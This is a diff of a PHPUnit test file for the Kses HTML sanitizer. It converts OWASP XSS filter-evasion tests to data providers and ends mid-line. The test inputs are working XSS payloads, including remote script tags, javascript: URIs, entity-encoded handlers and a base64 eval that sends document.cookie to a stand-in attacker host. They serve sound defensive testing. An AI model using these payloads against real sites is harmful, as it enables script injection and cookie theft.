@@ -12,12 +12,12 @@ class KsesOwaspTest extends \PHPUnit\Framework\TestCase
      */
     protected $kses;
 
-    protected function setUp()
+    protected function setUp(): void
     {
         $this->kses = new Kses(KsesAllowedList::getTagsAdmin());
     }
 
-    public function testBasicXss()
+    public function testBasicXss(): void
     {
         $filter = $this->kses
             ->filter('<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>');
@@ -25,40 +25,29 @@ class KsesOwaspTest extends \PHPUnit\Framework\TestCase
         $this->assertEquals($filter, '');
     }
 
-    public function testImageXss()
+    /**
+     * @dataProvider imageXssProvider
+     */
+    public function testImageXss(string $html, string $assert): void
     {
-        /* Image XSS using the JavaScript directive */
-        $filter = $this->kses
-            ->filter('<IMG SRC="javascript:alert(\'XSS\');">');
-
-        $this->assertEquals($filter, '<IMG src="alert(\'XSS\');">');
-
-        /* No quotes and no semicolon */
-        $filter2 = $this->kses
-            ->filter('<IMG SRC=javascript:alert(\'XSS\')>');
-
-        $this->assertEquals($filter2, '<IMG>');
-
-        /* Case insensitive XSS attack vector */
-        $filter3 = $this->kses
-            ->filter('<IMG SRC=JaVaScRiPt:alert(\'XSS\')>');
-
-        $this->assertEquals($filter3, '<IMG>');
-
-        /* HTML entities */
-        $filter4 = $this->kses
-            ->filter('<IMG SRC=javascript:alert(&quot;XSS&quot;)>');
-
-        $this->assertEquals($filter4, '<IMG src="alert(&quot;XSS&quot;)">');
-
-        /* Grave accent obfuscation */
-        $filter5 = $this->kses
-            ->filter('<IMG SRC=`javascript:alert("RSnake says, \'XSS\'")`>');
-
-        $this->assertEquals($filter5, '<IMG>');
+        $this->assertEquals($this->kses->filter($html), $assert);
     }
 
-    public function testMalformedATags()
+    public function imageXssProvider(): \Generator
+    {
+        /* Image XSS using the JavaScript directive */
+        yield [ '<IMG SRC="javascript:alert(\'XSS\');">', '<IMG src="alert(\'XSS\');">' ];
+        /* No quotes and no semicolon */
+        yield [ '<IMG SRC=javascript:alert(\'XSS\')>', '<IMG>' ];
+        /* Case insensitive XSS attack vector */
+        yield [ '<IMG SRC=JaVaScRiPt:alert(\'XSS\')>', '<IMG>' ];
+        /* HTML entities */
+        yield [ '<IMG SRC=javascript:alert(&quot;XSS&quot;)>', '<IMG src="alert(&quot;XSS&quot;)">' ];
+        /* Grave accent obfuscation */
+        yield [ '<IMG SRC=`javascript:alert("RSnake says, \'XSS\'")`>', '<IMG>' ];
+    }
+
+    public function testMalformedATags(): void
     {
         $filter = $this->kses
             ->filter('\<a onmouseover="alert(document.cookie)"\>xxs link\</a\>');
@@ -71,7 +60,7 @@ class KsesOwaspTest extends \PHPUnit\Framework\TestCase
         $this->assertEquals($filter2, '\<a>xxs link\</a>');
     }
 
-    public function testMalformedImgTags()
+    public function testMalformedImgTags(): void
     {
         $filter = $this->kses
             ->filter('<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>');
@@ -79,7 +68,7 @@ class KsesOwaspTest extends \PHPUnit\Framework\TestCase
         $this->assertEquals($filter, '<IMG>alert("XSS")"\&gt;');
     }
 
-    public function testFromCharCode()
+    public function testFromCharCode(): void
     {
         $filter = $this->kses
             ->filter('<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>');
@@ -87,7 +76,7 @@ class KsesOwaspTest extends \PHPUnit\Framework\TestCase
         $this->assertEquals($filter, '<IMG src="alert(String.fromCharCode(88,83,83))">');
     }
 
-    public function testDefautSrc()
+    public function testDefautSrc(): void
     {
         /* Default SRC tag to get past filters that check SRC domain */
         $filter = $this->kses
@@ -108,7 +97,7 @@ class KsesOwaspTest extends \PHPUnit\Framework\TestCase
         $this->assertEquals($filter3, '<IMG>');
     }
 
-    public function testImgOnerror()
+    public function testImgOnerror(): void
     {
         $filter = $this->kses
             ->filter('<IMG src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">');
@@ -116,7 +105,7 @@ class KsesOwaspTest extends \PHPUnit\Framework\TestCase
         $this->assertEquals($filter, '<IMG src="x">');
     }
 
-    public function testImgDecimalHtml()
+    public function testImgDecimalHtml(): void
     {
         /* Decimal HTML character references */
         $filter = $this->kses
@@ -133,7 +122,7 @@ class KsesOwaspTest extends \PHPUnit\Framework\TestCase
         $this->assertEquals($filter2, '<IMG src="&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041">');
     }
 
-    public function testImgHexadecimalHtml()
+    public function testImgHexadecimalHtml(): void
     {
         $filter = $this->kses
             ->filter('<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>');
@@ -141,34 +130,30 @@ class KsesOwaspTest extends \PHPUnit\Framework\TestCase
         $this->assertEquals($filter, '<IMG src="&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29">');
     }
 
-    public function testEmbedded()
+    /**
+     * @dataProvider embeddedProvider
+     */
+    public function testEmbedded(string $assert, string $html): void
     {
-        /* Embedded tab */
-        $filter = $this->kses
-            ->filter('<IMG SRC="jav	ascript:alert(\'XSS\');">');
-
-        $this->assertEquals($filter, '<IMG src="alert(\'XSS\');">');
-
-        /* Embedded Encoded tab */
-        $filter2 = $this->kses
-            ->filter('<IMG SRC="jav&#x09;ascript:alert(\'XSS\');">');
-
-        $this->assertEquals($filter2, '<IMG src="alert(\'XSS\');">');
-
-        /* Embedded newline to break up XSS */
-        $filter3 = $this->kses
-            ->filter('<IMG SRC="jav&#x0A;ascript:alert(\'XSS\');">');
-
-        $this->assertEquals($filter3, '<IMG src="alert(\'XSS\');">');
-
         /* Embedded carriage return to break up XSS */
-        $filter4 = $this->kses
-            ->filter('<IMG SRC="jav&#x0D;ascript:alert(\'XSS\');">');
+        $filter = $this->kses->filter($html);
 
-        $this->assertEquals($filter4, '<IMG src="alert(\'XSS\');">');
+        $this->assertEquals($filter, $assert);
     }
 
-    public function testNullBreaks()
+    public function embeddedProvider(): \Generator
+    {
+        /* Embedded tab */
+        yield [ '<IMG src="alert(\'XSS\');">', '<IMG SRC="jav	ascript:alert(\'XSS\');">' ];
+        /* Embedded Encoded tab */
+        yield [ '<IMG src="alert(\'XSS\');">', '<IMG SRC="jav&#x09;ascript:alert(\'XSS\');">' ];
+        /* Embedded newline to break up XSS */
+        yield [ '<IMG src="alert(\'XSS\');">', '<IMG SRC="jav&#x0A;ascript:alert(\'XSS\');">' ];
+        /* Embedded carriage return to break up XSS */
+        yield [ '<IMG src="alert(\'XSS\');">', '<IMG SRC="jav&#x0D;ascript:alert(\'XSS\');">' ];
+    }
+
+    public function testNullBreaks(): void
     {
         $filter = $this->kses
             ->filter('<IMG SRC=java\0script:alert(\"XSS\")>');
@@ -176,7 +161,7 @@ class KsesOwaspTest extends \PHPUnit\Framework\TestCase
         $this->assertEquals($filter, '<IMG>');
     }
 
-    public function testSpacesAndMetaChars()
+    public function testSpacesAndMetaChars(): void
     {
         $filter = $this->kses
             ->filter('<IMG SRC=" &#14;  javascript:alert(\'XSS\');">');
@@ -184,7 +169,7 @@ class KsesOwaspTest extends \PHPUnit\Framework\TestCase
         $this->assertEquals($filter, '<IMG src="alert(\'XSS\');">');
     }
 
-    public function testNonAlphaNonDigit()
+    public function testNonAlphaNonDigit(): void
     {
         $filter = $this->kses
             ->filter('<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>');
@@ -203,7 +188,7 @@ class KsesOwaspTest extends \PHPUnit\Framework\TestCase
         $this->assertEquals($filter3, '');
     }
 
-    public function testExtraneousOpenBrackets()
+    public function testExtraneousOpenBrackets(): void
     {
         $filter = $this->kses
             ->filter('<<SCRIPT>alert("XSS");//\<</SCRIPT>');
@@ -211,7 +196,7 @@ class KsesOwaspTest extends \PHPUnit\Framework\TestCase
         $this->assertEquals($filter, '&lt;alert("XSS");//\&lt;');
     }
 
-    public function NoClosingScriptTags()
+    public function NoClosingScriptTags(): void
     {
         $filter = $this->kses
             ->filter('<SCRIPT SRC=http://xss.rocks/xss.js?< B >');
@@ -219,7 +204,7 @@ class KsesOwaspTest extends \PHPUnit\Framework\TestCase
         $this->assertEquals($filter, '');
     }
 
-    public function NoProtocolResolutionInScriptTags()
+    public function NoProtocolResolutionInScriptTags(): void
     {
         $filter = $this->kses
             ->filter('<SCRIPT SRC=//xss.rocks/.j>');
@@ -227,7 +212,7 @@ class KsesOwaspTest extends \PHPUnit\Framework\TestCase
         $this->assertEquals($filter, '');
     }
 
-    public function HalfOpenHtml()
+    public function HalfOpenHtml(): void
     {
         $filter = $this->kses
             ->filter('<IMG SRC="`<javascript:alert>`(\'XSS\')"');
@@ -235,7 +220,7 @@ class KsesOwaspTest extends \PHPUnit\Framework\TestCase
         $this->assertEquals($filter, '<IMG>');
     }
 
-    public function testDoubleOpenAngleBrackets()
+    public function testDoubleOpenAngleBrackets(): void
     {
         $filter = $this->kses
             ->addAllowedTag('iframe')
@@ -244,7 +229,7 @@ class KsesOwaspTest extends \PHPUnit\Framework\TestCase
         $this->assertEquals($filter, '<iframe>');
     }
 
-    public function testEscapingJavaScriptEscapes()
+    public function testEscapingJavaScriptEscapes(): void
     {
         $filter = $this->kses
             ->filter('</script><script>alert(\'XSS\');</script>');
@@ -252,7 +237,7 @@ class KsesOwaspTest extends \PHPUnit\Framework\TestCase
         $this->assertEquals($filter, 'alert(\'XSS\');');
     }
 
-    public function testEndTitleTag()
+    public function testEndTitleTag(): void
     {
         $filter = $this->kses
             ->addAllowedTag('title')
@@ -261,7 +246,7 @@ class KsesOwaspTest extends \PHPUnit\Framework\TestCase
         $this->assertEquals($filter, '</TITLE>alert("XSS");');
     }
 
-    public function testInputImage()
+    public function testInputImage(): void
     {
         $filter = $this->kses
             ->addAllowedTag('input', [ 'src' => 1, 'type' => 1 ])
@@ -270,7 +255,7 @@ class KsesOwaspTest extends \PHPUnit\Framework\TestCase
         $this->assertEquals($filter, '<INPUT type="IMAGE" src="alert(\'XSS\');">');
     }
 
-    public function testBodyIimage()
+    public function testBodyIimage(): void
     {
         $filter = $this->kses
             ->addAllowedTag('body', [ 'background' => 1 ])
@@ -279,7 +264,7 @@ class KsesOwaspTest extends \PHPUnit\Framework\TestCase
         $this->assertEquals($filter, '<BODY background="alert(\'XSS\')">');
     }
 
-    public function testImgDynsrc()
+    public function testImgDynsrc(): void
     {
         $filter = $this->kses
             ->addAllowedTag('img', [ 'dynsrc' => 1 ])
@@ -288,7 +273,7 @@ class KsesOwaspTest extends \PHPUnit\Framework\TestCase
         $this->assertEquals($filter, '<IMG dynsrc="alert(\'XSS\')">');
     }
 
-    public function testImglowsrc()
+    public function testImglowsrc(): void
     {
         $filter = $this->kses
             ->addAllowedTag('img', [ 'lowsrc' => 1 ])
@@ -297,7 +282,7 @@ class KsesOwaspTest extends \PHPUnit\Framework\TestCase
         $this->assertEquals($filter, '<IMG lowsrc="alert(\'XSS\')">');
     }
 
-    public function testListStyleImage()
+    public function testListStyleImage(): void
     {
         $filter = $this->kses
             ->addAllowedTag('br')
@@ -306,7 +291,7 @@ class KsesOwaspTest extends \PHPUnit\Framework\TestCase
         $this->assertEquals($filter, 'li {list-style-image: url("javascript:alert(\'XSS\')");}<UL><LI>XSS</br>');
     }
 
-    public function testVBscriptInAnImage()
+    public function testVBscriptInAnImage(): void
     {
         $filter = $this->kses
             ->filter('<IMG SRC=\'vbscript:msgbox("XSS")\'>');
@@ -314,7 +299,7 @@ class KsesOwaspTest extends \PHPUnit\Framework\TestCase
         $this->assertEquals($filter, '<IMG src=\'msgbox("XSS")\'>');
     }
 
-    public function testLivescript()
+    public function testLivescript(): void
     {
         $filter = $this->kses
             ->filter('<IMG src=\'livescript:alert("XSS")\'>');
@@ -322,7 +307,7 @@ class KsesOwaspTest extends \PHPUnit\Framework\TestCase
         $this->assertEquals($filter, '<IMG src=\'alert("XSS")\'>');
     }
 
-    public function testSvgObjectTag()
+    public function testSvgObjectTag(): void
     {
         $filter = $this->kses
             ->addAllowedTag('svg')
@@ -331,7 +316,7 @@ class KsesOwaspTest extends \PHPUnit\Framework\TestCase
         $this->assertEquals($filter, '<svg>');
     }
 
-    public function testBodyTag()
+    public function testBodyTag(): void
     {
         $filter = $this->kses
             ->addAllowedTag('body')
@@ -340,7 +325,7 @@ class KsesOwaspTest extends \PHPUnit\Framework\TestCase
         $this->assertEquals($filter, '<BODY>');
     }
 
-    public function testImgStyleWithExpression()
+    public function testImgStyleWithExpression(): void
     {
         $filter = $this->kses
             ->filter('<IMG STYLE="xss:expr/*XSS*/ession(alert(\'XSS\'))">');
@@ -348,7 +333,7 @@ class KsesOwaspTest extends \PHPUnit\Framework\TestCase
         $this->assertEquals($filter, '<IMG>');
     }
 
-    public function testAnonymousHtmlWithStyleAttr()
+    public function testAnonymousHtmlWithStyleAttr(): void
     {
         $filter = $this->kses
             ->filter('<XSS STYLE="xss:expression(alert(\'XSS\'))">');
@@ -356,7 +341,7 @@ class KsesOwaspTest extends \PHPUnit\Framework\TestCase
         $this->assertEquals($filter, '');
     }
 
-    public function testIframe()
+    public function testIframe(): void
     {
         $filter = $this->kses
             ->setAllowedTags([
@@ -379,7 +364,7 @@ class KsesOwaspTest extends \PHPUnit\Framework\TestCase
         $this->assertEquals($filter3, '<FRAMESET><FRAME src="alert(\'XSS\');"></FRAMESET>');
     }
 
-    public function testTable()
+    public function testTable(): void
     {
         $filter = $this->kses
             ->setAllowedTags([
@@ -397,7 +382,7 @@ class KsesOwaspTest extends \PHPUnit\Framework\TestCase
         $this->assertEquals($filter2, '<TABLE><TD background="alert(\'XSS\')">');
     }
 
-    public function testDiv()
+    public function testDiv(): void
     {
         /* DIV background-image */
         $filter = $this->kses
@@ -425,7 +410,7 @@ class KsesOwaspTest extends \PHPUnit\Framework\TestCase
         $this->assertEquals($filter4, '<DIV>');
     }
 
-    public function testDownlevelHiddenBlock()
+    public function testDownlevelHiddenBlock(): void
     {
         $filter = $this->kses
             ->filter('<!--[if gte IE 4]>'
@@ -435,7 +420,7 @@ class KsesOwaspTest extends \PHPUnit\Framework\TestCase
         $this->assertEquals($filter, '');
     }
 
-    public function testBaseTag()
+    public function testBaseTag(): void
     {
         $filter = $this->kses
             ->addAllowedTag('base', [ 'href' => 1 ])
@@ -444,7 +429,7 @@ class KsesOwaspTest extends \PHPUnit\Framework\TestCase
         $this->assertEquals($filter, '<BASE href="alert(\'XSS\');//">');
     }
 
-    public function testServerSideIncludes()
+    public function testServerSideIncludes(): void
     {
         $filter = $this->kses
             ->filter('<!--#exec cmd="/bin/echo \'<SCR\'"--><!--#exec cmd="/bin/echo \'IPT SRC=http://xss.rocks/xss.js></SCRIPT>\'"-->');
@@ -452,7 +437,7 @@ class KsesOwaspTest extends \PHPUnit\Framework\TestCase
         $this->assertEquals($filter, '');
     }
 
-    public function testPhp()
+    public function testPhp(): void
     {
         $filter = $this->kses
             ->filter('<? echo(\'<SCR)\'; echo(\'IPT>alert("XSS")</SCRIPT>\'); ?>');
@@ -460,114 +445,62 @@ class KsesOwaspTest extends \PHPUnit\Framework\TestCase
         $this->assertEquals($filter, '&lt;? echo(\'alert("XSS")\'); ?&gt;');
     }
 
-    public function testXssUsingHtmlQuoteEncapsulation()
-    {
-        $filter = $this->kses
-            ->filter('<SCRIPT a=">" SRC="httx://xss.rocks/xss.js"></SCRIPT>');
-
-        $this->assertEquals($filter, '" SRC="httx://xss.rocks/xss.js"&gt;');
-
-        $filter = $this->kses
-            ->filter('<SCRIPT =">" SRC="httx://xss.rocks/xss.js"></SCRIPT>');
-
-        $this->assertEquals($filter, '" SRC="httx://xss.rocks/xss.js"&gt;');
-
-        $filter = $this->kses
-            ->filter('<SCRIPT a=">" \'\' SRC="httx://xss.rocks/xss.js"></SCRIPT>');
-
-        $this->assertEquals($filter, '" \'\' SRC="httx://xss.rocks/xss.js"&gt;');
-
-        $filter = $this->kses
-            ->filter('<SCRIPT "a=\'>\'" SRC="httx://xss.rocks/xss.js"></SCRIPT>');
-
-        $this->assertEquals($filter, '\'" SRC="httx://xss.rocks/xss.js"&gt;');
-
-        $filter = $this->kses
-            ->filter('<SCRIPT a=`>` SRC="httx://xss.rocks/xss.js"></SCRIPT>');
-
-        $this->assertEquals($filter, '` SRC="httx://xss.rocks/xss.js"&gt;');
-
-        $filter = $this->kses
-            ->filter('<SCRIPT a=">\'>" SRC="httx://xss.rocks/xss.js"></SCRIPT>');
-
-        $this->assertEquals($filter, '\'&gt;" SRC="httx://xss.rocks/xss.js"&gt;');
-
-        $filter = $this->kses
-            ->filter('<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="httx://xss.rocks/xss.js"></SCRIPT>');
-
-        $this->assertEquals($filter, 'document.write("PT SRC="httx://xss.rocks/xss.js"&gt;');
+    /**
+     * @dataProvider xssUsingHtmlQuoteEncapsulationProvider
+     */
+    public function testXssUsingHtmlQuoteEncapsulation(
+        string $html,
+        string $assert
+    ): void {
+        $this->assertEquals($this->kses->filter($html), $assert);
     }
 
-    public function testUrlEvasion()
+    public function xssUsingHtmlQuoteEncapsulationProvider(): \Generator
+    {
+        yield [ '<SCRIPT a=">" SRC="httx://xss.rocks/xss.js"></SCRIPT>', '" SRC="httx://xss.rocks/xss.js"&gt;' ];
+        yield [ '<SCRIPT =">" SRC="httx://xss.rocks/xss.js"></SCRIPT>', '" SRC="httx://xss.rocks/xss.js"&gt;' ];
+        yield [ '<SCRIPT a=">" \'\' SRC="httx://xss.rocks/xss.js"></SCRIPT>', '" \'\' SRC="httx://xss.rocks/xss.js"&gt;' ];
+        yield [ '<SCRIPT "a=\'>\'" SRC="httx://xss.rocks/xss.js"></SCRIPT>', '\'" SRC="httx://xss.rocks/xss.js"&gt;' ];
+        yield [ '<SCRIPT a=`>` SRC="httx://xss.rocks/xss.js"></SCRIPT>', '` SRC="httx://xss.rocks/xss.js"&gt;' ];
+        yield [ '<SCRIPT a=">\'>" SRC="httx://xss.rocks/xss.js"></SCRIPT>', '\'&gt;" SRC="httx://xss.rocks/xss.js"&gt;' ];
+        yield [ '<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="httx://xss.rocks/xss.js"></SCRIPT>', 'document.write("PT SRC="httx://xss.rocks/xss.js"&gt;' ];
+    }
+
+    /**
+     * @dataProvider providerUrlEvasion
+     */
+    public function testUrlEvasion(string $html, string $assert): void
+    {
+        $this->assertEquals($this->kses->filter($html), $assert);
+    }
+
+    public function providerUrlEvasion(): \Generator
     {
         /* IP versus hostname */
-        $filter = $this->kses
-            ->filter('<A HREF="http://66.102.7.147/">XSS</A>');
-
-        $this->assertEquals($filter, '<A href="http://66.102.7.147/">XSS</A>');
-
+        yield [ '<A HREF="http://66.102.7.147/">XSS</A>', '<A href="http://66.102.7.147/">XSS</A>' ];
         /* URL encoding */
-        $filter = $this->kses
-            ->filter('<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>');
-
-        $this->assertEquals($filter, '<A href="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>');
-
+        yield [ '<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>', '<A href="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>' ];
         /* DWORD encoding */
-        $filter = $this->kses
-            ->filter('<A HREF="http://1113982867/">XSS</A>');
-
-        $this->assertEquals($filter, '<A href="http://1113982867/">XSS</A>');
-
+        yield [ '<A HREF="http://1113982867/">XSS</A>', '<A href="http://1113982867/">XSS</A>' ];
         /* Hex encoding */
-        $filter = $this->kses
-            ->filter('<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>');
-
-        $this->assertEquals($filter, '<A href="http://0x42.0x0000066.0x7.0x93/">XSS</A>');
-
+        yield [ '<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>', '<A href="http://0x42.0x0000066.0x7.0x93/">XSS</A>' ];
         /* Octal encoding */
-        $filter = $this->kses
-            ->filter('<A HREF="http://0102.0146.0007.00000223/">XSS</A>');
-
-        $this->assertEquals($filter, '<A href="http://0102.0146.0007.00000223/">XSS</A>');
-
+        yield [ '<A HREF="http://0102.0146.0007.00000223/">XSS</A>', '<A href="http://0102.0146.0007.00000223/">XSS</A>' ];
         /* Base64 encoding */
-        $filter = $this->kses
-            ->filter('<img onload="eval(atob(\'ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU=\'))">');
-
-        $this->assertEquals($filter, '<img>');
-
+        yield [ '<img onload="eval(atob(\'ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU=\'))">', '<img>' ];
         /* Mixed encoding */
-        $filter = $this->kses
-            ->filter("<A HREF=\"h \ntt  p://6\t6.000146.0x7.147/\">XSS</A>");
-
-        $this->assertEquals($filter, "<A href=\"http://6\t6.000146.0x7.147/\">XSS</A>");
-
+        yield [ "<A HREF=\"h \ntt  p://6\t6.000146.0x7.147/\">XSS</A>", "<A href=\"http://6\t6.000146.0x7.147/\">XSS</A>" ];
         /* Protocol resolution bypass */
-        $filter = $this->kses
-            ->filter('<A HREF="//www.google.com/">XSS</A>');
-
-        $this->assertEquals($filter, '<A href="//www.google.com/">XSS</A>');
-
+        yield [ '<A HREF="//www.google.com/">XSS</A>', '<A href="//www.google.com/">XSS</A>' ];
         /* Google “feeling lucky” part 1. */
-        $filter = $this->kses
-            ->filter('<A HREF="//google">XSS</A>');
-
-        $this->assertEquals($filter, '<A href="//google">XSS</A>');
-
+        yield [ '<A HREF="//google">XSS</A>', '<A href="//google">XSS</A>' ];
         /* Google “feeling lucky” part 2. */
-        $filter = $this->kses
-            ->filter('<A HREF="http://ha.ckers.org@google">XSS</A>');
-
-        $this->assertEquals($filter, '<A href="http://ha.ckers.org@google">XSS</A>');
-
+        yield [ '<A HREF="http://ha.ckers.org@google">XSS</A>', '<A href="http://ha.ckers.org@google">XSS</A>' ];
         /* Google “feeling lucky” part 3. */
-        $filter = $this->kses
-            ->filter('<A HREF="http://google:ha.ckers.org">XSS</A>');
-
-        $this->assertEquals($filter, '<A href="http://google:ha.ckers.org">XSS</A>');
+        yield [ '<A HREF="http://google:ha.ckers.org">XSS</A>', '<A href="http://google:ha.ckers.org">XSS</A>' ];
     }
 
-    public function testLinkJavascriptLocation()
+    public function testLinkJavascriptLocation(): void
     {
         $filter = $this->kses
             ->filter('<A HREF="javascript:document.location=\'http://www.google.com/\'">XSS</A>');
@@ -575,7 +508,7 @@ class KsesOwaspTest extends \PHPUnit\Framework\TestCase
         $this->assertEquals($filter, '<A href="document.location=\'http://www.google.com/\'">XSS</A>');
     }
 
-    public function testCharacterEscapeSequences()
+    public function testCharacterEscapeSequences(): void
     {
         $filter = $this->kses
             ->filter('<
